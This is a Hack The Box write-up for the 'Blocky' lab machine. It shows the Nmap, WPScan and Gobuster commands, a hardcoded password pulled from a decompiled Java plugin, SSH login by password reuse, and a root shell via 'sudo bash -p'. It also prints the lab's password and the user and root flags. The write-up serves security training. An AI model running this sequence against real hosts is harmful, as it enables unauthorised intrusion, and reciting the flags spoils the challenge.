
# HTB - Blocky

## Machine Information

* Machine: Blocky
* IP: 10.129.59.195
* OS: Linux
* Difficulty: Easy

## 1. Port Scanning

We begin by scanning all TCP ports with Nmap:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.129.59.195 -oG Allports
```

The scan reveals four open ports:

```text
# Nmap 7.991 scan initiated Tue Sep 22 22:12:49 2026 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV -oG Allports 10.129.59.195
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.129.59.195 ()  Status: Up
Host: 10.129.59.195 ()  Ports: 21/open/tcp//ftp?///, 22/open/tcp//ssh//OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)/, 80/open/tcp//http//Apache httpd 2.4.18/, 25565/open/tcp//minecraft//Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0|20)/
# Nmap done at Tue Sep 22 22:13:30 2026 -- 1 IP address (1 host up) scanned in 40.75 seconds
```

The relevant services are:

* `21/tcp` — FTP
* `22/tcp` — SSH
* `80/tcp` — HTTP
* `25565/tcp` — Minecraft

We then perform a more detailed scan against those ports:

```bash
nmap -sCV -p21,22,80,25565 10.129.59.195 -oN Targeted
```

The results show:

```text
PORT      STATE SERVICE   VERSION
21/tcp    open  ftp?
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http      Apache httpd 2.4.18
|_http-generator: WordPress 4.8
|_http-title: BlockyCraft &#8211; Under Construction!
|_http-server-header: Apache/2.4.18 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.11.2
```

The SSH version is relatively old, but instead of immediately attempting to exploit it, we first enumerate the web application.

## 2. Web Enumeration

We access the web server and identify a WordPress installation.

The site is running:

```text
WordPress 4.8
```

The page also contains posts that reveal a username:

```text
notch
```

We enumerate WordPress users with WPScan:

```bash
wpscan --url http://blocky.htb/ --enumerate u
```

We also enumerate directories with Gobuster:

```bash
gobuster dir -u http://blocky.htb/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100
```

Among the interesting directories, we find:

```text
wiki
wp-content
plugins
wp-includes
javascript
wp-admin
phpmyadmin
```

The most interesting one is:

```text
http://blocky.htb/plugins/
```

## 3. Discovering Credentials in a Java Plugin

The `/plugins/` directory exposes two `.jar` files.

We download the Java archives and inspect them with `jd-gui`.

One of the classes contains database credentials:

```java
package com.myfirstplugin;

public class BlockyCore {
  public String sqlHost = "localhost";
  
  public String sqlUser = "root";
  
  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
  
  public void onServerStart() {}
  
  public void onServerStop() {}
  
  public void onPlayerJoin() {
    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
  }
  
  public void sendMessage(String username, String message) {}
}
```

The important value is:

```text
sqlUser = root
sqlPass = 8YsqfCTnvxAUeduzjNSXe22
```

We can then try the discovered password against the `notch` SSH account.

## 4. Initial Access

Using the discovered credentials, we connect through SSH:

```bash
ssh notch@10.129.59.195
```

Once connected, we check the home directory:

```bash
notch@Blocky:~$ ls
minecraft  user.txt
```

The user flag is present:

```bash
notch@Blocky:~$ cat user.txt
9cf7db6276eeec6689b33a91a8b33072
```

Therefore:

```text
User flag: 9cf7db6276eeec6689b33a91a8b33072
```

## 5. Privilege Escalation

We now enumerate our privileges.

First, we check our groups:

```bash
notch@Blocky:~$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

The important group is:

```text
sudo
```

We then check our sudo permissions:

```bash
notch@Blocky:~$ sudo -l
```

The system asks for the user's password and then returns:

```text
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

This means that `notch` can execute commands as any user, including `root`.

We can therefore obtain a root shell with:

```bash
sudo bash -p
```

We verify our privileges:

```bash
root@Blocky:~# whoami
root
```

We are now root.

## 6. Root Flag

The root flag is located at:

```text
/root/root.txt
```

We read it:

```bash
root@Blocky:~# cat /root/root.txt
835cf94a6b950cb25685708ec243820f
```

Therefore:

```text
Root flag: 835cf94a6b950cb25685708ec243820f
```

## Attack Path

1. Enumerated all TCP ports with Nmap.
2. Identified a WordPress 4.8 installation.
3. Enumerated WordPress users and discovered `notch`.
4. Enumerated web directories with Gobuster.
5. Discovered the publicly accessible `/plugins/` directory.
6. Downloaded the exposed Java plugin.
7. Decompiled the `.jar` with `jd-gui`.
8. Discovered hardcoded database credentials.
9. Reused the discovered password to authenticate to SSH as `notch`.
10. Retrieved the user flag.
11. Enumerated sudo permissions.
12. Discovered that `notch` could execute any command as root.
13. Used `sudo bash -p` to obtain a root shell.
14. Retrieved the root flag.

## Vulnerabilities & Techniques

### Information Disclosure

Sensitive database credentials were hardcoded inside a publicly accessible Java plugin:

```text
sqlUser = root
sqlPass = 8YsqfCTnvxAUeduzjNSXe22
```

### Credential Reuse

The discovered password was reused for the `notch` SSH account, allowing initial access to the machine.

### Excessive Sudo Privileges

The `notch` user had unrestricted sudo permissions:

```text
(ALL : ALL) ALL
```

This allowed arbitrary commands to be executed as root.

### Privilege Escalation

The final escalation was performed with:

```bash
sudo bash -p
```

which provided a root shell.

pwned :)))))
